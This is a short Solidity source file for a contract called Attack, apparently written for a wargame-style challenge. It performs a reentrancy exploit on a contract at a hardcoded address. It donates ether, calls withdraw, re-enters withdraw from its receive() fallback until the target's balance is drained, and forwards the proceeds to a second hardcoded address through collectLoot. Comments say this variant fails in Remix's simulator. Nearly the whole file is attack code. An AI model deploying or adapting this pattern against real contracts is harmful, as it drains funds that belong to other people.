//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

//this contract conducts the attack in the same order as 
//the Attack.sol file but using a low-level approach

//The attack fails because RemixIDE's dry-run simulator 
//struggles with selfdestruct() and call{} in the same tx

//the txn will be mined but the execution will fail with a 
//gas estimate error


contract Attack{

    address payable target;

    constructor() public payable{
        target = payable(0xF760AcC547E9a4Ab28b7FF9FD45204D057fD3ADD);
    }

    function attack() public {
        (bool suc, )= target.call{value: 10000000000000000}(abi.encodeWithSignature("donate(address)", address(this)));
        require(suc, "txn failed");
        (bool success, )= target.call(abi.encodeWithSignature("withdraw(uint256)", 10000000000000000));
        require(success, "failed txn");

    }


    receive() external payable{
        if(target.balance>=1000) {
            target.call(abi.encodeWithSignature("withdraw(uint256)", 10000000000000000));
        }
        else if(target.balance<1000 && target.balance>0) target.call(abi.encodeWithSignature("withdraw(uint256)", target.balance));
    }

    function collectLoot() public {
        payable(0x25584D7A2a5A8915369897A7Cc2B60B11d72f657).transfer(address(this).balance);
    }

}
